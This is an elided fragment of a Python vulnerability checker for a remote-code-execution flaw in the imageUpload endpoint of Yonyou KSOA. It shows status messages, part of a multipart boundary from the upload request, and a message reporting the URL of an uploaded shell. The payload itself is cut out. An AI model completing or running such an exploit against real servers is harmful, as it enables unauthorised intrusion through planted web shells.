...
def main(target_url):
    ...
    if target_url[-1] != '/':
        target_url += '/'
    success_msg = now_time() + '[SUCCESS]用友 yongyou_KSOA_imageUpload-RCE-漏洞'
    warning_msg = now_time() + '[WARNING]用友 yongyou_KSOA_imageUpload-RCE-漏洞不存在'
    error_msg = now_time() + '[用友 yongyou_KSOA_imageUpload-RCE-漏洞][ERROR]请求失败，可能无法与目标建立连接或目标不存在'
...
---------------------------122739796041499160471980406311'''
    ...
    shell_msg = now_time() + '测试URL为: {}'.format(shell_url)
    try:
